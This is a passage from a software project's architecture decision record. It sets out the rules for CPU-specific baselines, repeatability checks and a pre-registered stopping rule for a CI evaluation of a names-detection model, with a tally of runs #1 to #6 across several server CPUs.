   CPU model: its instruction-set facts that bear on the hypothesis
   (AVX-512, AMX), with the public source they come from, and the
   **predicted group**: the i5-12450H / EPYC 7763 hashes (`96a5c328…` /
   `ba1a6b82…`), or the Xeon Platinum 8573C / Xeon 6973P-C hashes
   (`d1f611f0…` / `46dd8ff3…`). If the facts cannot be found, the entry
   says "no prediction" rather than guessing.
3. **Commit that entry** (and push it) before the file is opened.
4. Then open the file and record the result against the committed
   prediction: held, failed, or a third pair of hashes. **A failed
   prediction is a result against the hypothesis**, recorded as one; it
   changes nothing about the keying, which is by CPU model (C1) precisely
   so that it does not depend on the hypothesis.

The step does not replace the minting rule: a predicted and confirmed
group is still no baseline until two counted runs on that model agree.

### C1 and C3 as built (Phase 6c, 2026-10-07)

- **C1, one baseline per CPU model.** `eval/names-baselines.json` maps the
  exact CPU model string a run reports (`os.cpus()[0].model`, surrounding
  whitespace trimmed, nothing else) to a baseline file in `eval/` and a
  note of where it came from. `eval/names-baseline.json`, the published
  baseline, is unchanged (the pre-registration: "the Windows baseline as
  it is"). Two models point to it: the i5-12450H (measured) and the AMD
  EPYC 7763 (run #1, identical in every compared field, so the same file
  records exactly what was observed). The Intel Xeon Platinum 8573C has no
  entry yet: run #2's log did not print its per-row metrics, so its
  baseline comes from the result file of a later counted run on that CPU,
  committed by a human (a run that reproduces #2's hashes has #2's
  metrics, since the metrics are computed from the names).
- **An unknown CPU passes with a warning** (exit 0, a `::warning::`
  annotation on GitHub), says it is that CPU model's first result, and
  writes `names-result.json` (the machine, the outcome, both passes' hashes
  and every measured field; hashes and counts only, never a text), which
  the workflow attaches to every run. Its baseline is added only by a
  human commit: copy `measured` into `eval/names-baseline-<cpu>.json` and
  add the model to the index.
- **The rule for minting a baseline (the user, 2026-10-07): two separate
  runs on that CPU model that agree, not one.** Two completed runs, in
  separate jobs (so separate processes, sessions and hosts), each passing
  its own second pass, whose two hashes and every measured field are
  identical; only then is either run's `measured` committed. **The reason
  is C3's stated limit:** C3 repeats the messages within one process and
  one session, so it does not show that a fresh process gives the same
  spans, and a baseline minted from one run would rest on exactly that
  untested case. The Xeon Platinum 8573C is such a CPU: one run so far,
  so no baseline yet. If the two runs disagree, no baseline is minted for
  that model, and that disagreement is itself a result under the stopping
  rule (a CPU model that is not deterministic). The two runs used to mint a
  baseline are also counted runs. (The i5-12450H's baseline met this long
  before the rule: 8 runs on Windows and 1 on Linux, in separate
  processes. The EPYC 7763's entry rests on one run, #1, matching the i5's
  already-minted baseline exactly: it reuses a baseline rather than mints
  one, and the next counted run on the EPYC checks it.)
- **Known gap, the unknown-CPU window.** Until a CPU model's baseline is
  committed, runs on it compare against nothing: a change that moved its
  spans would pass there. **There is no tolerance band** to cover the
  window: no metric is compared "within a margin" on any CPU; a CPU is
  either compared exactly or not at all. The window closes for each CPU
  model when its baseline is committed.
- **C3, the messages twice in one run.** `eval:names` puts all 1,998
  messages through the gateway a second time, in the same process and the
  same worker, and fails ("NOT REPEATABLE", exit 1) unless both passes give
  the same two hashes, checked before any baseline. Not covered: whether a
  fresh process (a new session) gives the same spans as this one; the
  separate runs of the stopping rule cover that across runs.
- The logic is in `eval/names/gateway.ts` (`parseIndex`, `baselineFor`,
  `outcome`, `exitCode`, `outcomeLines`), tested in
  `test/unit/eval/names/gateway.test.ts`; `eval/names-run.ts` wires it.
  First run with both, on the i5-12450H: identical to its baseline, second
  pass identical.
- **Confirmed working on a real runner (Names run #3, 2026-10-07, as
  reported by the user).** The run landed on an AMD EPYC 7763; its output
  shows both mechanisms: C1 selected that CPU model's entry ("Identical to
  the baseline for AMD EPYC 7763 64-Core Processor", the exact model string
  the index holds), and C3's second pass ran and equalled the first ("Second
  pass: equal to the first"). B's spans `96a5c328…`, names `ba1a6b82…`, 933
  detections, R 501/612, precision 661/933, 5.85 per 1,000 words; 293.0 ms
  per KiB (run #1: 292.1). Its install step printed the same as run #1:
  `onnxruntime-node` 301,068,136 bytes, `libonnxruntime.so.1` 45,828,512,
  `onnxruntime_binding.node` 389,488. **Its install input is unknown, and
  is recorded as unknown:** it is not in the job log and cannot be
  recovered, and it is not guessed. From now on the workflow's Install step
  prints the resolved input as its first line (testing guide). Whether #3
  counts is **pending**, on the same question as #1 and #2 (the
  pre-registered `default` run, in the stopping rule's section below).
- **The NuGet download stays unmeasured** and the item stays open: run #3
  cannot be the measurement, because its input is unknown. The next run
  with `default` measures it and says so in its own log.
- **The EPYC 7763: checked now, "confirmed" later (the user's decision,
  option (b), the literal reading of the minting rule).** The two-run rule
  is met by the hashes (#1 and #3, separate jobs, every field identical)
  but not by its text: #1 ran before C3 existed, so it never passed a
  second pass of its own, and it ran on an older tree, so it was a
  different build as well as a different process. So the EPYC is **not
  yet labelled confirmed**; it needs one more completed run with its own
  second pass and a recorded install input. Reasons, the user's: the cost
  is a few days and nothing blocks on it; and the first application of a
  rule is exactly when it should not be read generously, since a rule whose
  purpose is honoured instead of its text the first time it is used has a
  soft precedent from then on. **What waits is the label, not the
  checking:** the EPYC's entry stays in `eval/names-baselines.json` for the
  reason already settled, so that a future EPYC run that disagrees fails
  loudly (DIFFERENT, exit 1) instead of passing as an unknown CPU.
  **Confirmed 2026-10-10, by run #5** (see "Runs #5 and #6" at the end of
  this ADR).

### The model in CI: a cache keyed by the pins, the pinned download behind it (Phase 6c, 2026-10-07; the user chose option M2)

> **A corrupt cache can fail the job; it cannot produce wrong spans.**
> Every file the cache restores is hashed by `fetch:model` (size and
> SHA-256 against the pins) before it is kept, and hashed again by the
> gateway before the model is loaded (`checkModelFiles`), which refuses to
> start on any mismatch. A wrong file therefore stops the job before any
> span exists. That is what makes caching a 178.5 MB model safe rather
> than a risk.

How it is built (`.github/workflows/names.yml`): `actions/cache/restore`
and `actions/cache/save` (v6.1.0, pinned to commit `55cc8345…`), path
`models/`, key `name-model-<hash of src/gateway/name-model.ts>`: the file
that holds the repository, the commit and each file's SHA-256, so a new
pin is a new key (an edit elsewhere in that file is a harmless extra
download). On a hit, `fetch:model` finds each file in place, checks it and
keeps it; on a miss it downloads the four files from the pinned Hugging
Face commit (option M1) and checks them; the save step then stores what
was verified, before the comparison runs, so that a DIFFERENT result does
not make the next run download again. Not measured yet: restore and
download times on the runner (each run's log shows them). GitHub keeps a
repository's caches up to 10 GB and evicts one unused for 7 days; a cache
from a pull request is scoped to it and cannot replace `main`'s.

### Pre-registered: when the names workflow may run on every push (Phase 6c, 2026-10-07; written and committed before the first manual run)

The user chose option E4: the names workflow runs **manually** first
(`workflow_dispatch`), and moves to every push and pull request (option
E1) only by this rule, written before any manual run. It exists because
GitHub's runners are not one machine: the same label lands on hosts with
different CPUs, the runtime chooses kernels by CPU, and if hosts disagree
an every-push check would fail by host, not by change.

- **What counts:** a completed manual run of the workflow with the
  default install setting (`skip`, CI's). A run with `default` is for the
  install measurement only. A run that does not complete does not count
  (as above). **(Amended 2026-10-10: a scheduled run counts too; see
  "Amendment 2026-10-10: scheduled runs count" at the end of this ADR.)**
  Each counted run is recorded here: date, CPU model and
  count, B's span hash, the names hash, and whether each equals the
  Windows baseline.
- **E1 is adopted only when all of these hold:** at least **10** counted
  runs; at least **2 distinct CPU models** among them; at least **3**
  counted runs on each of at least two of those models; and **every
  counted run gives the same two hashes as every other** (agreement among
  the runner runs; whether they also equal Windows is the pre-registered
  comparison above, a separate question).
- **If any two counted runs disagree on either hash**, the hashes are not
  stable across hosts: E1 is not adopted, the workflow stays manual and
  gains a weekly schedule (E3) with each run's machine recorded, the
  pre-registration's per-machine rule applies, and the question returns to
  the user.
- **If 20 counted runs pass without two CPU models with three runs each**,
  nothing is concluded about hosts in general: E1 is not adopted, a weekly
  schedule (E3) is added to keep meeting new hosts, and the question
  returns to the user.
- **A second exit, added 2026-10-10 (an addition; S2's adoption condition
  is untouched): if 20 counted runs pass while any counted CPU model still
  lacks a committed baseline, E1 is NOT adopted.** See "Ruling
  (2026-10-10): the second exit" at the end of this ADR.
- **Why these numbers:** one matching run on one host says nothing about
  hosts; three on one CPU model show that model is deterministic; two
  models are the least that "across hosts" can mean. They are a judgement,
  fixed here so that the decision is not made by whichever run is in front
  of us.

**Amendment S2 (2026-10-07, the user's decision, made after runs #1 and #2
and because of them).** The rule above asked for one pair of hashes on
every host. Runs #1 and #2 answered that: the same code gave one pair on
the AMD EPYC 7763 and another on the Intel Xeon Platinum 8573C, so under
the rule as written E1 could never be adopted, and an every-push check
against one baseline would fail by host. With one baseline per CPU model
(C1), the question that matters becomes whether **each CPU model gives one
pair of hashes every time**. Amended accordingly; everything else stands:

- **E1 is adopted only when all of these hold:** at least **10** counted
  runs; at least **2 distinct CPU models** among them, with at least **3**
  counted runs on each of at least two; **every counted run on a CPU model
  gives the same two hashes as every other counted run on that model**
  (different models may differ); and every CPU model counted has its
  baseline committed.
- **Any two counted runs on the same CPU model disagree** (or a run fails
  its own second pass): that model is not deterministic, E1 is not
  adopted, and the question returns to the user.
- **The tally is provisional (2026-10-07, after run #3).** Runs #1, #2
  and #3 all rest on **one unverified inference**: that "no CUDA library
  on disk" means the input was `skip`. None of their inputs is in its log;
  each install put the same two files on disk and no CUDA library. #1 and
  #2 were counted on that inference; #3 has exactly the same install
  output, so **#3 is pending on the same question, not separately
  disqualified**. A provisional reading would be 2 of 10 (#1 on the EPYC
  7763, #2 on the Xeon Platinum 8573C) with #3 pending, but no number is
  settled until the run below. **Settled by that run (#4): 3 of 10, below.**

#### Pre-registered: the `default` run decides all three (the user, 2026-10-07; written and committed before that run)

The next run with `onnxruntime-install: default` measures the NuGet
download (still unmeasured), and its outcome decides #1, #2 and #3
together:

- **If the `default` run installs CUDA libraries** (any of the files the
  installed package's `script/install-metadata.js` lists for
  `linux/x64:cuda12` appears in `node_modules/onnxruntime-node/bin/napi-v6/linux/x64/`):
  the inference holds. "No CUDA on disk" means `skip`, and **#1, #2 and #3
  all count** on that basis. **Tally 3 of 10, on two models**: EPYC 7763 2
  (#1, #3), Xeon Platinum 8573C 1 (#2).
- **If the `default` run is byte-identical to a `skip` install** (the same
  `onnxruntime-node` total, 301,068,136 bytes by `du -sb`, the same two
  files at the same sizes, no provider library): the install output cannot
  distinguish the inputs at all. Then #1's and #2's basis is void along
  with #3's, **none of the three count**, and only runs from #4 onward,
  which print their own input, are admissible. **Tally 0 of 10.**
- **Anything else** (the install fails, the run does not complete, or the
  contents are neither of the two above): nothing is decided, the result
  is reported as it is, and the tally stays provisional until a `default`
  run gives one of the two outcomes. (This case added by me, so that the
  rule covers every outcome; the two above are the user's.)
- The `default` run itself never counts, whatever it shows: only `skip`
  runs count.

**The rule was not amended to recover a run.** It counts runs by their
input, as it did before #3; this section only fixes, in advance, what the
measurement means for evidence about inputs that the logs did not keep.
**Both outcomes were written before the measurement, including the one
that costs every counted run so far** (0 of 10). Whichever it gives is
applied as written.

**Result (Names run #4, 2026-10-07): branch 1, applied as written.** The
`default` run installed CUDA libraries: `libonnxruntime_providers_cuda.so`
(272,054,000 bytes), `libonnxruntime_providers_tensorrt.so` (1,084,896)
and `libonnxruntime_providers_shared.so` (14,632) appeared in the package's
`bin` folder, `onnxruntime-node` 574,221,664 bytes against 301,068,136.
So "no CUDA on disk" means the input was `skip`, and **#1, #2 and #3 all
count**. **Tally: 3 of 10 counted, on two CPU models: AMD EPYC 7763 2
(#1, #3), Intel Xeon Platinum 8573C 1 (#2).** Run #4 itself does not
count (a `default` run), and its CPU, the Intel Xeon 6973P-C, has no
baseline, so it checked nothing against one (outcome NEW CPU). In the
close-out's terms so far: 4 runs, 3 counted on two models, 1 uncounted
(`default`, on an unbaselined CPU), 0 incomplete. The outcome that would
have cost all three counted runs was not the one measured; nothing was
chosen after the fact.

**What each CPU model still needs** (the rule for minting a baseline,
above: two completed counted runs in separate jobs, each with its own
second pass, identical):

| CPU model                 | Counted runs | With their own second pass | Baseline                               | Needs                                         |
| ------------------------- | ------------ | -------------------------- | -------------------------------------- | --------------------------------------------- |
| Intel Core i5-12450H      | (local)      | (local, many)              | `names-baseline.json`                  | nothing                                       |
| AMD EPYC 7763             | 2 (#1, #3)   | 1 (#3; #1 predates C3)     | the i5's (in the index, not confirmed) | one more counted run with its own second pass |
| Intel Xeon Platinum 8573C | 1 (#2)       | 0 (#2 predates C3)         | none                                   | two counted runs with their own second pass   |
| Intel Xeon 6973P-C        | 0            | 0 (#4 had one, uncounted)  | none                                   | two counted runs with their own second pass   |

(This table is as of run #4; superseded by the one under "Runs #5 and #6"
at the end of this ADR.)

#4's result cannot mint the 6973P-C's baseline, because a `default` run
never counts. If the 8573C and the 6973P-C are minted with identical
results, each still gets its own entry in the index (C1 keys by model;
they may share one file, as the i5 and the EPYC do).

**Daily, and temporary (the user, 2026-10-07).** The workflow runs once a
day as well as by hand (`schedule`, 04:23 UTC; a scheduled run installs
with `skip`, so it counts). **Corrected 2026-10-10:** when this was
written, "so it counts" disagreed with "What counts", which required a
manual run; it held only from the amendment of 2026-10-10 ("Amendment
2026-10-10: scheduled runs count", at the end of this ADR). Daily, not weekly: at one run a week, about six
weeks to reach 10 runs, and this project finishes first. It exists only to
accumulate counted runs on as many runner CPUs as possible; it is removed,
or replaced by E1, when the rule is closed out (below). GitHub does not
choose a runner's CPU on request, so which models appear, and how often,
is outside the project's control.

**How this is closed out, written now, before the end (the user,
2026-10-07).** When the work on this project finishes:

1. Record here **every run, not only the counted ones**: the total, then
   how many were counted (by the rule's own definition, "What counts"
   above, as amended on 2026-10-10: a completed run with the `skip` input,
   dispatched by hand or by the schedule; before that amendment this
   parenthesis dropped "manual" and disagreed with the rule) on how many models, and
   how many **checked nothing** because their CPU model had no baseline
   (the NEW CPU outcome, which exits 0), by model, and any that did not
   complete. For example: "17 runs: 11 counted on two models, 6 on an
   unbaselined CPU (Xeon Platinum 8573C), 0 incomplete". **For each counted
   run, also whether it was checked against its own CPU model's
   baseline** (a counted run on a model with no baseline yet counts, and
   checked nothing). With each run's CPU model and two hashes, and which
   models' baselines were committed and when. The reason: an unknown CPU
   passes with an annotation nobody reads on a daily scheduled job, so a
   change in GitHub's fleet could produce weeks of green runs that checked
   nothing, and a counted total alone would hide it.
2. State whether the threshold above was reached.
3. If it was reached, E1 is adopted as the rule says. **If it was not, say
   that E1 was not adopted and that the rule remains open**, with what is
   missing (runs, models, or runs per model). **If the second exit (added
   2026-10-10) has fired, say so instead: E1 was not adopted, and that
   outcome is final, not open.**
4. **The rule is not loosened to fit whatever was collected, and it is not
   dropped.** Fewer runs than required is recorded as fewer runs than
   required, not as a smaller threshold.

**Corrected 2026-10-07 (after run #4):** step 1 first said "counted
(compared with a committed baseline for their CPU model)". That
parenthesis was mine, a restatement, and it disagreed with the rule it
summarised: by it, run #2 would not count (the Xeon Platinum 8573C has no
baseline of its own; #2 was compared with the i5-12450H's, before C1),
while by the rule's definition it does. The parenthesis is replaced by the
rule's definition; nothing in the rule changed.

**The principle, stated generally: when a later summary and the
pre-registered text disagree, the rule wins and the summary is corrected,
never the reverse.** That is how a pre-registration erodes in practice: not
by an amendment, which is dated and argued, but by a convenient
restatement further down the page that a later reader takes for the rule.
Every summary in this ADR of a pre-registered rule (tallies, close-out
steps, README and user-manual sentences) is read against the rule it
summarises, and where they differ, the summary is the one that changes.

**Counted runs so far, and what each was checked against:**

| Run | CPU model                 | Input                      | Counted | Checked against its own model's baseline                                                                                           |
| --- | ------------------------- | -------------------------- | ------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| #1  | AMD EPYC 7763             | `skip` (by inference)      | yes     | no: compared with the i5-12450H's baseline, before C1 gave the EPYC an entry                                                       |
| #2  | Intel Xeon Platinum 8573C | `skip` (by inference)      | yes     | no: compared with the i5-12450H's baseline, before C1; the 8573C still has no baseline                                             |
| #3  | AMD EPYC 7763             | `skip` (by inference)      | yes     | yes: the EPYC's entry in the index (C1), which points to the i5's file                                                             |
| #4  | Intel Xeon 6973P-C        | `default` (measurement)    | no      | no: no baseline for its model (NEW CPU)                                                                                            |
| #5  | AMD EPYC 7763             | `skip` (printed; schedule) | yes     | yes: the EPYC's entry (C1); identical, second pass equal                                                                           |
| #6  | AMD EPYC 9V74             | `skip` (printed; schedule) | yes     | no: no baseline for its model (NEW CPU); hashes, opened after the prediction was committed: the Xeon group (see "Run #6's result") |

The three "by inference" inputs rest on the pre-registered conditional,
settled by #4 (branch 1). From run #5 on, each run prints its input.

### Amendment 2026-10-10: scheduled runs count (the user's ruling)

**The conflict.** The record said two things. "What counts" requires **a
completed manual run** with the `skip` input. The daily-schedule decision
of 2026-10-07 says "a scheduled run installs with `skip`, so it counts".
And close-out step 1, as corrected after run #4, restated the definition
as "a completed run with the `skip` input", dropping "manual" too. Runs #1
to #4 were all dispatched by hand, so the disagreement never mattered and
never surfaced. It surfaced on 2026-10-10, when two scheduled runs (#5 on
2026-10-08, #6 on 2026-10-09, both reported green) raised the question of
whether they count. Read by this ADR's own principle (the rule wins over a
later summary), they would not have.

**The ruling.** A completed run with the `skip` install input counts,
**whether it was dispatched by hand or by the schedule.** Everything else
in the rule (S2 included) stands.

**The reasoning, which is about the rule's purpose.** "Manual" was a proxy
for knowing which install input a run used: a run dispatched by hand had
its input chosen by a person, and the rule wanted only `skip` runs. The
proxy was imperfect even for manual runs, which is why #1 to #3's inputs
had to be reconstructed by inference, from the size of the install and
the absence of CUDA libraries (settled by run #4's pre-registered
comparison). Since `dc4c66b` (2026-10-07), the workflow prints the input
itself as the Install step's first line: `onnxruntime-install for this
run: <MODE> (started by: <EVENT>)`. The quantity the proxy stood for is now
observed in the run itself. **A proxy is obsolete once the real thing is
measured.** A run counts by its printed input, `skip`, whatever started it.

**That consequence is prospective.** It applies to runs of a workflow that
prints its input, from `dc4c66b` (2026-10-07) onward: for those, a run
whose Install step does not print `skip` does not count. It does **not**
apply to runs #1 to #3, which ran before the input was printed and could
not print it. **They keep their counted status**, on the route already
settled: the pre-registered CUDA conditional ("Pre-registered: the
`default` run decides all three"), resolved by run #4 (branch 1). Read
retroactively, the sentence would take the tally from 3 to 0; it is not to
be read that way. Both routes are legitimate, for different reasons. The
inference was pre-registered before the evidence arrived, with both
outcomes written down (including the one that would have cost all three
runs), and it was resolved by a run designed to resolve it. Direct
printing does not overturn that; it only makes inference unnecessary from
now on.

**Two disclosures.**

- **Timing.** This amendment is made at a moment when it happens to halve
  the remaining work: it can turn two runs that would not count into runs
  that do, and makes every later daily run eligible. The reasoning above
  does not depend on that, and would stand if the ruling slowed the
  project down (if, say, it disqualified runs instead).
- **Scheduled runs may not be exchangeable with manual ones for which
  runner GitHub assigns.** The schedule's cron expression says 04:23 UTC,
  but that is not when the runs started: the two scheduled runs so far
  started at about **11:29 UTC (#5, 2026-10-08)** and **11:25 UTC (#6,
  2026-10-09)**, some seven hours later (start times given by the user
  from the workflow's list of runs). So the schedule does not sample 04:23;
  it samples whenever GitHub actually starts a delayed scheduled job,
  which on both days so far was within a few minutes of the same time. That
  is still a narrow slot, and one this project neither chose nor controls,
  where manual runs fell at different times.
  This does not affect the hash-agreement condition: a CPU model either
  gives the same two hashes every time or it does not, whenever it is met.
  It may affect **which CPU models accumulate**, and model coverage (two
  models with three counted runs each, each with its baseline) is already
  the binding constraint. If the schedule keeps landing on the same one or
  two models, that is a property of the slot, not evidence about the
  fleet.

**Order, and what protects the ruling.** This amendment is committed
**before** the logs of #5 and #6 are read. **One counting-relevant fact was
known when it was written: both runs completed** (they were reported
green), and completion is one of the rule's own conditions. Still unknown
and unread: their install input, their CPU model, their outcome line and
their hashes. Also known, and not counting-relevant: their dates and start
times (above), which the user gave to correct the timing disclosure after
the ruling was written.

What protects the ruling from being shaped by these runs is therefore not
ignorance of their status. It is that **the intention to count scheduled
runs is dated 2026-10-07**, in the daily-schedule decision ("a scheduled
run installs with `skip`, so it counts"), **before Names #5 and #6
existed**. This amendment restores a stated intention that predates both
runs; it does not invent one after seeing that they passed. Whether each
counts is decided afterwards, under the rule as amended, from its printed
input and its completion.

### Runs #5 and #6 (2026-10-08 and 2026-10-09, scheduled; assessed 2026-10-10)

Values as reported by the user from each run's log; the assistant cannot
reach GitHub. #6's `names-result.json` has **not** been opened.

- **#5, counts.** Install printed
  `onnxruntime-install for this run: skip (started by: schedule)`: the
  input is printed, so the amended rule applies directly. Completed: every step green, `test:names` 6 passed.
  The install agrees (`onnxruntime-node` 301,068,136 bytes, no CUDA or
  TensorRT file). CPU `AMD EPYC 7763 64-Core Processor`, 4 logical CPUs,
  Linux `6.17.0-1022-azure`, Node v22.23.3. B's spans `96a5c328…`, names
  `ba1a6b82…`, second pass equal to the first; 933 detections, R 501/612,
  main 145/153, precision 661/933, 5.85 per 1,000 words; 294.5 ms per KiB.
  Outcome: identical to the EPYC 7763's baseline, which is the i5-12450H's
  file, so also equal to the Windows baseline. (`eval:names` shows
  `ONNXRUNTIME_NODE_INSTALL (unset)`: the variable is set only inside the
  Install step, as noted above; not a contradiction.)
- **#6, counts, and checked nothing.** Install printed
  `skip (started by: schedule)`; completed (green; `test:names` 6 passed; install as #5's).
  CPU `AMD EPYC 9V74 80-Core Processor`, 4 logical CPUs. Outcome NEW CPU
  (exit 0): no baseline for that model, results withheld. **Its second
  pass agreed with its first**, known without opening the file: `outcome`
  (`eval/names/gateway.ts`) returns NOT REPEATABLE before it looks for a
  baseline, so a NEW CPU outcome implies the two passes matched. A counted
  run on a model with no baseline counts and checked nothing (close-out,
  step 1).

**The EPYC 7763 is now labelled confirmed.** The condition, in this ADR's
words: "it needs one more completed run with its own second pass and a
recorded install input". #5 is all three. The minting rule's two runs are
#3 and #5: separate jobs, each with its own second pass, the same two
hashes and every measured field identical (both "identical … every
metric"). Speed (293.0 against 294.5 ms per KiB) is a machine figure
outside the compared fields.

**Tally: 5 of 10 counted, on three CPU models.** AMD EPYC 7763 3 (#1, #3,
#5); Intel Xeon Platinum 8573C 1 (#2); AMD EPYC 9V74 1 (#6). Not counted:
#4 (`default`). In the close-out's terms: 6 runs; 5 counted on three
models; 2 checked nothing because their model has no baseline (#4,
uncounted, on the Xeon 6973P-C; #6, counted, on the EPYC 9V74); 0
incomplete.

**Adoption conditions (S2), now:**

| Condition                                                   | Now                                                       | Met?   |
| ----------------------------------------------------------- | --------------------------------------------------------- | ------ |
| at least 10 counted runs                                    | 5                                                         | no     |
| at least 2 distinct CPU models                              | 3                                                         | yes    |
| at least 3 counted runs on each of at least two models      | EPYC 7763 3; no second model                              | no     |
| every counted run on a model gives that model's same hashes | EPYC 7763: #1, #3, #5 agree; the others have one run each | so far |
| every counted CPU model has its baseline committed          | EPYC 7763 yes; Xeon Platinum 8573C no; EPYC 9V74 no       | no     |

**What each CPU model still needs** (supersedes the table after run #4):

| CPU model                 | Counted runs   | Own second pass    | Baseline                     | Needs                                                         |
| ------------------------- | -------------- | ------------------ | ---------------------------- | ------------------------------------------------------------- |
| AMD EPYC 7763             | 3 (#1, #3, #5) | 2 (#3, #5)         | the i5's file, **confirmed** | nothing                                                       |
| Intel Xeon Platinum 8573C | 1 (#2)         | 0 (#2 predates C3) | none                         | two counted runs with their own second pass that agree        |
| AMD EPYC 9V74             | 1 (#6)         | 1 (#6)             | none                         | one more counted run that agrees with #6                      |
| Intel Xeon 6973P-C        | 0              | 0 (#4 uncounted)   | none                         | nothing unless a counted run lands there; then two that agree |

**What #6 does to adoption, stated plainly.** A counted run cannot be
uncounted, so the EPYC 9V74 is now a model that must have a committed
baseline before E1 can be adopted, and that needs **at least one more
counted run on that exact model**, which GitHub may never assign again.
The minimum now outstanding is **5 more counted runs**: two on the Xeon
Platinum 8573C (which also gives a second model three runs), one on the
EPYC 9V74, and two more on any model with a baseline. Every counted run on
a further new model adds at least one more required run on that model.
Six runs have met four CPU models, three of them once each. **The
20-counted-run exit has become somewhat more likely**, because runs
spread over more models reach three per model more slowly, though the EPYC
7763 already fills one of the two places. **The larger effect is one the
rule has no exit for:** a counted model that never recurs leaves "every
counted CPU model has its baseline committed" unmet indefinitely. The
20-run exit tests only the run counts, not the baselines, so in that case
the rule neither adopts E1 nor reaches its inconclusive exit; the
close-out would record E1 as not adopted and the rule as open. That is
recorded, not changed.

### Standing step: the predicted group for the AMD EPYC 9V74 (written 2026-10-10, committed before `names-result.json` is opened)

**The CPU facts, with sources and how far each was checked** (read
2026-10-10, through web search and a fetch tool that passes pages through
a summarising model):

- **EPYC 9V74: Zen 4 ("Genoa"), with AVX-512. Verified.** A specification
  aggregator (chaynikam.info, "EPYC 9V74") gives codename "Genoa", socket
  SP5, 5 nm, released 2022, and lists AVX-512. An XMRig benchmark record
  of a machine reporting `AMD EPYC 9V74 80-Core Processor`
  (xmrig.com/benchmark/DxxCW) lists `avx512f` among its CPU flags, with
  CPUID `A10F11`: family 19h, model 11h, which is in Genoa's model range
  (that mapping is general knowledge, not from those pages). Neither is
  AMD's own documentation: the 9V74 is a custom part with no public AMD
  page found.
- **EPYC 7763: Zen 3 ("Milan"), no AVX-512. Verified, more weakly.**
  WikiChip's EPYC 7763 page, as summarised by a search (the page itself
  refused the connection), lists AVX2, FMA3 and SHA and no AVX-512;
  OpenBenchmarking.org calls it a Zen 3 part. AMD's first AVX-512 parts are
  Zen 4. This ADR already recorded it as having none (the GitHub runners
  result above).
- **Zen 4 has no AMX. Not verified from a source; inferred.** (Sourced
  later, after #6's result was opened: see "Run #6's result" below. The
  prediction is left as committed.) No page read
  states it outright. AMX is Intel's extension, introduced with Sapphire
  Rapids; the Zen 4 instruction lists found (AVX-512 F, VL, BW, CD, IFMA,
  DQ, VPOPCNTDQ, BITALG, VNNI, VBMI, VBMI2, BF16, as summarised by a web
  search over sources including Phoronix's Genoa launch review and AMD's
  Hot Chips 2023 slides; which source listed what was not checked) do not
  include it; AMD has announced a matrix engine only for a later
  generation.
- **Not checked, and the largest gap: what the runner itself exposes.**
  The workflow prints the CPU's model name, not its flags, so whether the
  Azure VM behind run #6 passed AVX-512 through to the guest is not
  observed.

**Why this CPU matters.** The hypothesis as recorded names "AVX-512 and
AMX" together, because every CPU so far had both (the two Xeons) or
neither (the i5-12450H, the EPYC 7763). The EPYC 9V74 has AVX-512 without
AMX: it is the first CPU that separates the two.

**Prediction: the Xeon group**, B's spans `d1f611f0…` and names
`46dd8ff3…` (the Xeon Platinum 8573C's and Xeon 6973P-C's). **Confidence:
medium.** Reasoning: the quantised model's integer matrix products are
exact whichever kernel computes them, so differences in spans are more
likely to come from the floating-point kernels, which the runtime can run
with AVX-512 on any CPU that reports it, AMD included; AMX would only
change the integer path.

**What would refute it:**

- **The i5-12450H / EPYC 7763 group** (`96a5c328…`, `ba1a6b82…`) refutes
  "AVX-512 decides". It would fit "AMX decides" (or something else only the
  Intel parts have), or a VM that hides AVX-512 from the guest; this
  record could not tell those apart.
- **A third pair of hashes** refutes the two-group picture itself: the
  instruction-set hypothesis as recorded allows only the two groups.
- Either way, as the standing step says, a failed prediction changes
  nothing about the keying (C1 keys by CPU model), and the EPYC 9V74 still
  needs a second counted run that agrees with #6 before it has a baseline.

### Every run now prints the CPU flags the guest sees (2026-10-10, before #6's `names-result.json` is opened)

**The change.** The workflow step "What the install put on disk, and on
which CPU" (name unchanged) now also prints the `flags` line of
`/proc/cpuinfo` and one line per flag that bears on the hypothesis:
`avx2`, `avx512f`, `avx512bw`, `avx512vl`, `avx512_vnni`, `avx512_bf16`,
`avx_vnni`, `amx_tile`, `amx_int8`, `amx_bf16`, each `yes` or `no`. If the
file has no flags line, it prints "CPU flags not observed" instead of a
column of `no`s, which would be a false observation.

**Why.** The prediction above has a "not checked" row: whether the runner
VM exposes AVX-512 to the guest. Its own refutation analysis says an
i5-12450H / EPYC 7763 result on the 9V74 would be ambiguous between "AMX
decides" and "the VM hid AVX-512". With the guest's flags in every log,
the second becomes observable rather than assumed. (What the kernel lists
is what the guest's CPUID reports, after the kernel's own masking; the
runtime reads CPUID itself. Close evidence for what the runtime sees, not
the same observation.)

**Order, and why it matters.** This change is made and committed **before**
#6's `names-result.json` is opened. Added afterwards, it would read as a
response to the result, for instance as a way to explain a failed
prediction away.

**It cannot affect what the evaluation computes.** It is an extra echo, and
nothing more: it runs in its own step, before the comparison, in its own
shell; it reads `/proc/cpuinfo`, writes only to the log, sets no variable
that outlives the step and writes no file; it changes no input to
`npm ci`, `fetch:model`, `test:names` or `eval:names`. It cannot fail the
step either: the read ends in `|| true`, and an empty result is reported,
not acted on, so it cannot turn a completed run into an incomplete one.
Checked on this machine with `bash --noprofile --norc -eo pipefail`, as
GitHub runs a step: on the i5-12450H's own `/proc/cpuinfo` it printed
`avx2: yes`, `avx_vnni: yes`, `avx512f: no` and `amx_*: no`, as expected
for that part; on a file with no flags line it printed "CPU flags not
observed" and exited 0. The workflow file still parses (Prettier).

**It does not help #6.** #6's flags were never printed and cannot be
recovered; the prediction above stands as written, with its "not checked"
row. The 9V74 needs at least one more counted run anyway for its baseline,
and that run will print them.

### Put to the user under rule 6 (2026-10-10): the stopping rule had no exit for a counted model that never recurs (ruled the same day: option 2, below)

**The hole.** S2's adoption condition includes "every CPU model counted
has its baseline committed", and a baseline needs two agreeing counted
runs on that model. The 20-counted-run exit (the original rule, which S2
left standing) tests only run counts: "If 20 counted runs pass without two
CPU models with three runs each". So if a counted CPU model never appears
again, the rule neither adopts E1 nor reaches its inconclusive exit. This
is live, not hypothetical: six runs have met four CPU models, three of them
once each, and two of those three (the Xeon Platinum 8573C, the EPYC 9V74)
are counted and have no baseline.

**Why now.** It is settled now, while nobody knows whether it will bite.
Neither unbaselined model has visibly gone missing yet: the 8573C was last
seen four runs ago, the 9V74 the day before this was written. Once a model
has visibly gone missing, any fix would read as motivated, however
sensible. Deciding the exit before that is known is what keeps it from
being shaped by it.

**The options** (nothing decided here):

1. **Leave the rule as it is.** Neither an amendment nor an addition. The
